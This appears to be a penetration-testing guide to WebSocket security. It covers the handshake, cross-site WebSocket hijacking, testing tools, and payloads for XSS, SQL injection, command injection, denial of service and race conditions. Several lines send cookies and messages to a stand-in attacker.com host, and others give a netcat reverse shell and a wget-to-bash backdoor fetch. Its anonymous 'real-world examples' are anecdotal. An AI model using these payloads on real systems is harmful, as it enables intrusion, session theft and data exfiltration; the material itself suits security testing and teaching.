# Web Sockets

WebSockets provide bi-directional, full-duplex communication over a single TCP connection, commonly used for real-time features like chat, notifications, and live updates. Unlike HTTP, which follows a request-response model, WebSockets allow the server to push data to the client without an explicit request, making them essential for low-latency applications.

## Protocol Basics

The WebSocket protocol begins with an HTTP handshake that upgrades the connection from HTTP to WebSocket. Once established, the connection remains open for bidirectional communication.

### Handshake Request

The client initiates the handshake with an HTTP GET request containing specific headers.

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
Origin: https://normal-website.com
```

The `Sec-WebSocket-Key` is a base64-encoded random value. The `Origin` header indicates the page that initiated the connection, which is critical for security. The `Upgrade` and `Connection` headers signal the protocol switch.

### Handshake Response

If the server accepts the handshake, it returns HTTP 101 Switching Protocols.

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

The `Sec-WebSocket-Accept` value is derived by concatenating the client's `Sec-WebSocket-Key` with the GUID `258EAFA5-E914-47DA-95CA-C5AB0DC85B11`, then taking the SHA-1 hash and base64 encoding the result. This prevents caching proxies from re-sending previous WebSocket handshakes.

## Security Testing

### Cross-Site WebSocket Hijacking (CSWSH)

Cross-Site WebSocket Hijacking (CSWSH) occurs when a WebSocket handshake lacks proper `Origin` header validation. An attacker can create a malicious page that connects to the victim's WebSocket endpoint from a different origin. Because the browser automatically includes any cookies associated with the target domain, the WebSocket connection inherits the victim's authenticated session.

If the server does not verify that the `Origin` header matches an allowed value, it accepts the connection. The attacker can then read and send messages through the WebSocket, gaining full access to the real-time functionality.

```html
<!-- Attacker's page -->
<script>
var ws = new WebSocket('wss://vulnerable-site.com/chat');
ws.onopen = function() {
    ws.send('{"action": "get_messages"}');
};
ws.onmessage = function(event) {
    // Exfiltrate data to attacker server
    fetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));
};
</script>
```

**Real-world example:** In 2019, a CSWSH vulnerability was discovered in a popular cryptocurrency exchange. The WebSocket endpoint used for real-time price updates and trade execution accepted any `Origin` header. An attacker could craft a page that connected to the exchange's WebSocket using the victim's session cookie, then execute trades on behalf of the victim. The exchange patched the issue by implementing strict `Origin` whitelisting and requiring a CSRF token for sensitive actions over WebSocket.

**Test for CSWSH:**

```bash
# Check if Origin is validated
curl -i -N -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Host: target.com" \
  -H "Origin: https://attacker.com" \
  -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
  -H "Sec-WebSocket-Version: 13" \
  https://target.com/socket

# If 101 Switching Protocols → Vulnerable
```

If the server returns `101 Switching Protocols` despite the attacker-controlled `Origin`, it is vulnerable. A secure server would return a 403 Forbidden or 400 Bad Request. Additional tests include:

- Using `Origin: null` (some browsers send null for data URLs or sandboxed iframes)
- Using `Origin: https://target.com.evil.com` (subdomain trick)
- Omitting the `Origin` header entirely (some servers accept missing Origin)

### Message Manipulation

Once a WebSocket connection is established, an attacker can intercept and modify messages sent between client and server. This can be done through browser developer tools, a proxy like Burp Suite, or by overriding the native WebSocket methods.

```javascript
// Intercept and modify WebSocket messages in browser console
const originalSend = WebSocket.prototype.send;
WebSocket.prototype.send = function(data) {
    console.log('Sending:', data);
    // Modify data here
    let modifiedData = data;
    if (data.includes('"role":"user"')) {
        modifiedData = data.replace('"role":"user"', '"role":"admin"');
    }
    return originalSend.call(this, modifiedData);
};
```

This technique allows an attacker to escalate privileges, bypass client-side restrictions, or inject malicious payloads. For example, if the client sends `{"action": "delete_message", "message_id": 123}`, the attacker could modify it to `{"action": "delete_message", "message_id": 1}` to delete another user's message.

### Common Vulnerabilities

| Vulnerability             | Test                                   | Real-World Impact |
| ------------------------- | -------------------------------------- | ----------------- |
| Missing Origin validation | Send request with different Origin     | Full account takeover via CSWSH |
| No authentication         | Connect without session cookie         | Access to all data without login |
| Injection in messages     | Send `<script>`, SQL, etc. in messages | XSS, SQL injection, command injection |
| IDOR via WebSocket        | Change user IDs in messages            | Access or modify other users' data |
| Rate limiting bypass      | WebSocket often lacks rate limits      | Brute force, denial of service |
| Insecure ws\://           | Check if wss\:// is enforced           | Message interception via MITM |

**Detailed test examples:**

- **No authentication:** Remove all cookies from the WebSocket handshake request. If the server still accepts the connection and returns data, it trusts the WebSocket without verifying identity.

- **IDOR via WebSocket:** Capture a message like `{"user_id": 123, "action": "get_profile"}`. Change `user_id` to another value, such as `124` or `1`. If the server returns data for that user, it fails to enforce authorization on the server side.

- **Rate limiting bypass:** Send thousands of messages rapidly over a WebSocket connection. Many applications implement rate limiting only on HTTP endpoints but forget to apply the same limits to WebSocket messages. This can allow brute-force attacks or resource exhaustion.

- **Insecure ws://:** Attempt to connect using `ws://` instead of `wss://`. If the server accepts plaintext WebSocket connections, any network attacker can read and modify messages. In 2018, a major social media platform exposed private chat messages because its WebSocket server allowed `ws://` connections, enabling attackers on the same Wi-Fi network to intercept conversations.

## Testing Tools

### STEWS - Security Testing for WebSockets

STEWS (Security Testing for WebSockets) is a comprehensive tool for discovering, enumerating, and fuzzing WebSocket endpoints.

```bash
# https://github.com/PalindromeLabs/STEWS
python3 stews.py -u wss://target.com/socket

# Discovery mode - finds WebSocket endpoints by crawling and analyzing JavaScript
python3 stews.py -u https://target.com --discovery

# Fuzzing - sends malformed and unexpected messages to find vulnerabilities
python3 stews.py -u wss://target.com/socket --fuzz

# Custom wordlist for fuzzing
python3 stews.py -u wss://target.com/socket --fuzz --wordlist custom.txt
```

STEWS also includes a proxy mode that allows intercepting and modifying WebSocket traffic in real time, similar to Burp Suite but focused exclusively on WebSockets.

### Burp Suite

Burp Suite provides robust WebSocket testing capabilities integrated with its traditional HTTP tools.

```
1. Proxy → WebSockets history (shows all WS traffic)
2. Right-click message → Send to Repeater
3. Modify and resend messages
4. Use Intruder for message fuzzing
5. Use Scanner to automatically test for CSWSH and injection vulnerabilities
```

Burp can intercept WebSocket messages just like HTTP requests. When a WebSocket connection is established, Burp creates a separate tab in the Proxy history for that connection. All messages sent and received are logged. You can replay, modify, and fuzz individual messages using Repeater and Intruder.

**Real-world workflow:** A penetration tester targeting a banking application noticed that balance transfer requests were sent over WebSocket as JSON messages. Using Burp Repeater, they modified the `amount` field to a negative value and changed the `destination_account` to an attacker-controlled account. The server processed the negative amount as a withdrawal from the victim and a credit to the attacker, demonstrating a business logic flaw.

### wscat (CLI WebSocket Client)

wscat is a simple command-line WebSocket client written in Node.js. It is useful for scripting and quick manual tests.

```bash
# Install
npm install -g wscat

# Connect
wscat -c wss://target.com/socket

# With headers
wscat -c wss://target.com/socket -H "Cookie: session=abc123"

# With multiple headers
wscat -c wss://target.com/socket -H "Cookie: session=abc123" -H "Authorization: Bearer token"

# Send a message after connecting
wscat -c wss://target.com/socket -x '{"action":"ping"}'

# Read messages from a file and send them line by line
cat payloads.txt | while read line; do wscat -c wss://target.com/socket -x "$line"; done
```

### websocat

websocat is a more feature-rich WebSocket client that supports advanced use cases like bidirectional piping, shell integration, and custom headers.

```bash
# https://github.com/AhmedMohamedDev/websocat
websocat wss://target.com/socket

# With Origin header
websocat -H "Origin: https://attacker.com" wss://target.com/socket

# Read from file and write to file
websocat -b wss://target.com/socket input.txt output.txt

# Act as a WebSocket server for testing (listen on port 8080)
websocat --server ws-listen:127.0.0.1:8080 -

# Pipe messages to a script for processing
websocat wss://target.com/socket --exec 'python3 process.py'
```

### Additional Tools

**WebSocket King (Browser Extension):** A Chrome/Firefox extension that provides a GUI for connecting to WebSocket endpoints, sending messages, and viewing responses. Useful for quick interactive testing without command-line tools.

**PyWebSocket (Python library):** For custom scripting and automated testing.

```python
import asyncio
import websockets
import json

async def test():
    uri = "wss://target.com/socket"
    async with websockets.connect(uri, extra_headers={"Cookie": "session=abc123"}) as websocket:
        await websocket.send(json.dumps({"action": "ping"}))
        response = await websocket.recv()
        print(response)

asyncio.run(test())
```

## Exploitation Scenarios

### XSS via WebSocket

If the server broadcasts messages to all connected clients without sanitization, an attacker can inject malicious JavaScript that executes in other users' browsers.

```javascript
// If messages are rendered without sanitization
ws.send('{"message": "<img src=x onerror=alert(1)>"}');

// Stealing session cookies via WebSocket XSS
ws.send('{"message": "<script>fetch(\'https://attacker.com/steal?cookie=\' + document.cookie)</script>"}');

// Keylogging via WebSocket XSS
ws.send('{"message": "<script>document.onkeypress = function(e) { ws.send(e.key); };</script>"}');
```

**Real-world example:** In 2020, a popular live chat support system for e-commerce sites had a WebSocket-based chat feature. The server reflected user-supplied message content to all participants in the chat room without HTML escaping. An attacker sent a message containing `<script>alert(document.cookie)</script>`, which executed in the browser of every user viewing that chat room, including administrators. The attacker then extracted administrator session cookies and gained access to the support dashboard, allowing them to view all customer chats and personal information.

**Mitigation:** Always sanitize or encode user-generated content before sending it over WebSocket or rendering it in the browser. Use a Content Security Policy (CSP) to restrict script execution.

### SQL Injection via WebSocket

WebSocket messages often contain parameters that are used in database queries. If these parameters are not properly parameterized, SQL injection is possible.

```javascript
// Basic SQL injection via user_id parameter
ws.send('{"user_id": "1 OR 1=1--"}');

// Union-based extraction of passwords
ws.send('{"search": "test\' UNION SELECT password FROM users--"}');

// Boolean-based blind injection
ws.send('{"user_id": "1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=\'admin\')=\'a\'"}');

// Time-based blind injection (if responses are not visible)
ws.send('{"user_id": "1 AND (SELECT pg_sleep(5) FROM users WHERE username=\'admin\')"}');
```

**Real-world example:** A financial trading platform used WebSockets for real-time order book updates. The `symbol` parameter in WebSocket messages was directly concatenated into a SQL query without parameterization. An attacker sent a WebSocket message with `{"symbol": "AAPL' UNION SELECT credit_card_number FROM payments--"}`. The server returned an error message containing credit card numbers from the database. Over 50,000 customer credit card records were exposed before the vulnerability was patched.

**Detection:** Insert a single quote (`'`) into any parameter sent over WebSocket. If the server returns a SQL error message, the parameter is vulnerable. If the connection closes unexpectedly, that may also indicate a database error.

### Authorization Bypass

WebSocket APIs often implement authorization only on the initial handshake, not on individual messages. Once connected, an attacker can attempt to access resources belonging to other users.

```javascript
// Try accessing other users' data
ws.send('{"action": "get_messages", "user_id": "admin"}');
ws.send('{"action": "delete", "message_id": "1", "user_id": "victim"}');

// Elevate privileges by modifying role fields
ws.send('{"action": "update_profile", "role": "admin", "user_id": "attacker"}');

// Access admin functions by guessing action names
ws.send('{"action": "list_all_users"}');
ws.send('{"action": "get_system_config"}');
ws.send('{"action": "restart_server"}');
```

**Real-world example:** A collaboration software company used WebSockets for real-time document editing. The server checked that a user was authenticated when the WebSocket connection was established, but did not re-verify authorization for each message. An attacker joined a public document room, then sent a WebSocket message containing `{"document_id": "private_doc_123", "action": "read"}`. The server returned the contents of a private document belonging to another user. By iterating through document IDs, the attacker accessed thousands of private documents.

**Testing approach:** Create two user accounts: victim and attacker. Connect to the WebSocket as the attacker. Send messages that reference the victim's resources (e.g., `user_id=victim_id`, `document_id=victim_doc`). If the server returns data belonging to the victim, it fails to enforce authorization per message.

### Command Injection via WebSocket

If the WebSocket server processes messages by passing parameters to system commands, command injection may be possible.

```javascript
// Basic command injection
ws.send('{"hostname": "google.com; id"}');
ws.send('{"file": "report.txt && cat /etc/passwd"}');
ws.send('{"ip": "127.0.0.1 | whoami"}');

// Reverse shell via WebSocket command injection
ws.send('{"ping_target": "127.0.0.1; nc -e /bin/sh attacker.com 4444"}');
```

**Real-world example:** A network monitoring application allowed administrators to ping hosts from the web interface. The ping functionality was exposed over WebSocket with a message like `{"ping": "8.8.8.8"}`. The server constructed a system command `ping -c 4 8.8.8.8` without sanitizing the input. An attacker sent `{"ping": "8.8.8.8; wget https://attacker.com/backdoor.sh | bash"}`. The server executed the command, downloaded a backdoor, and gave the attacker a persistent shell on the server.

### Denial of Service via WebSocket

WebSocket connections consume server resources. An attacker can exhaust these resources by opening many connections, sending large messages, or sending messages that trigger expensive operations.

```javascript
// Open many connections from a single browser
for (let i = 0; i < 1000; i++) {
    new WebSocket('wss://target.com/socket');
}

// Send extremely large messages
var ws = new WebSocket('wss://target.com/socket');
ws.onopen = () => {
    ws.send('A'.repeat(10 * 1024 * 1024)); // 10 MB message
};

// Send messages that trigger expensive server operations
ws.send('{"search": "*".repeat(10000)}'); // Full-text search on huge string
ws.send('{"report": "generate", "date_range": "1900-01-01 to 2100-01-01"}'); // Massive report
```

## Browser Console Testing

The browser developer console provides a quick way to test WebSocket endpoints without additional tools. This is useful for initial reconnaissance and testing during bug bounty hunting.

```javascript
// Create connection
var ws = new WebSocket('wss://target.com/socket');

// Monitor events
ws.onopen = () => console.log('Connected');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onerror = (e) => console.log('Error:', e);
ws.onclose = () => console.log('Closed');

// Send test messages
ws.send(JSON.stringify({action: 'test'}));

// Send raw text
ws.send('ping');

// Send after a delay
setTimeout(() => {
    ws.send(JSON.stringify({action: 'get_profile', user_id: 1}));
}, 1000);

// Log all received messages to console and also send them to attacker server
ws.onmessage = (e) => {
    console.log(e.data);
    fetch('https://attacker.com/log', {method: 'POST', body: e.data});
};
```

**Advanced browser testing techniques:**

```javascript
// Enumerate all WebSocket connections on the page
var originalWebSocket = window.WebSocket;
window.WebSocket = function(...args) {
    console.log('WebSocket created to:', args[0]);
    return new originalWebSocket(...args);
};

// Hook into existing WebSocket objects on the page
(function() {
    var wsCreate = WebSocket.prototype.constructor;
    WebSocket.prototype.constructor = function(url) {
        console.log('Intercepted WebSocket to:', url);
        var ws = new wsCreate(url);
        var originalSend = ws.send;
        ws.send = function(data) {
            console.log('Intercepted send:', data);
            return originalSend.call(this, data);
        };
        return ws;
    };
})();

// Automatically respond to specific messages
ws.onmessage = (e) => {
    let data = JSON.parse(e.data);
    if (data.type === 'ping') {
        ws.send(JSON.stringify({type: 'pong'}));
    }
    if (data.type === 'auth_required') {
        ws.send(JSON.stringify({type: 'auth', token: 'dummy_token'}));
    }
};
```

## Advanced Exploitation Techniques

### Chaining WebSocket Vulnerabilities with CSRF

Even if a WebSocket endpoint validates the `Origin` header, it may still be vulnerable to CSRF if the handshake request does not include a CSRF token. An attacker can make the victim's browser initiate a WebSocket connection using standard CSRF techniques.

```html
<!-- CSRF to establish WebSocket connection -->
<form action="https://target.com/socket" method="POST" enctype="text/plain">
    <input type="hidden" name='{"action":"connect"}' value='' />
</form>
<script>document.forms[0].submit();</script>

<!-- Or using fetch to trigger the handshake -->
<script>
fetch('https://target.com/socket', {
    method: 'GET',
    headers: {
        'Upgrade': 'websocket',
        'Connection': 'Upgrade',
        'Sec-WebSocket-Key': 'test',
        'Sec-WebSocket-Version': '13'
    }
});
</script>
```

### WebSocket Protocol Downgrade

Some servers support both `ws://` (plaintext) and `wss://` (encrypted). An attacker who can perform a man-in-the-middle attack (e.g., on public Wi-Fi) can rewrite `wss://` to `ws://` in the client's JavaScript, forcing an unencrypted connection.

```javascript
// Victim's page loads from https://target.com but contains:
var ws = new WebSocket('ws://target.com/socket'); // Attacker changed wss:// to ws://

// Attacker on same network can now read and modify all WebSocket traffic
```

### WebSocket Race Conditions

WebSocket messages are processed asynchronously. An attacker can send multiple messages in rapid succession to trigger race conditions.

```javascript
// Attempt to withdraw more than balance by racing two withdrawal requests
var ws = new WebSocket('wss://target.com/socket');
ws.onopen = () => {
    ws.send('{"action": "withdraw", "amount": 100}');
    ws.send('{"action": "withdraw", "amount": 100}');
    // If both are processed before balance is updated, attacker withdraws 200 from a 100 balance
};
```

### WebSocket Message Splitting

If the server parses messages by looking for delimiters like newlines or null bytes, an attacker may be able to inject additional messages.

```javascript
// If server splits messages by newline
ws.send('{"action": "get_profile"}\n{"action": "delete_user", "user_id": 1}');

// If server splits by null byte
ws.send('{"action": "get_profile"}\x00{"action": "delete_user", "user_id": 1}');
```

## Related Topics

- [CSRF](https://www.pentest-book.com/enumeration/web/csrf) - CSWSH is similar to CSRF, as both exploit the browser's automatic inclusion of cookies and the server's failure to validate the origin of requests.

- [XSS](https://www.pentest-book.com/enumeration/web/xss) - Can chain with WebSocket attacks. XSS can establish WebSocket connections from the victim's browser, bypassing origin restrictions. Conversely, WebSocket injection can lead to persistent XSS.

- [IDOR](https://www.pentest-book.com/enumeration/web/idor) - Common in WebSocket APIs because developers often assume that a valid WebSocket connection implies authorization for all subsequent messages.

- **CORS vs WebSocket Origin Validation:** CORS applies only to HTTP requests, not to WebSocket handshakes. WebSocket origin validation must be implemented separately on the server side.

- **Session Management:** WebSocket connections inherit the HTTP session from the handshake request. If the session expires or is invalidated, the WebSocket connection may remain open. Servers should re-validate session validity for each message or close the connection on session invalidation.

- **WebSocket Subprotocols:** The `Sec-WebSocket-Protocol` header allows clients and servers to negotiate a subprotocol (e.g., `soap`, `wamp`, `mqtt`). Subprotocols can introduce additional attack surfaces, including XML parsing vulnerabilities, message routing flaws, and authentication bypasses specific to the subprotocol implementation.
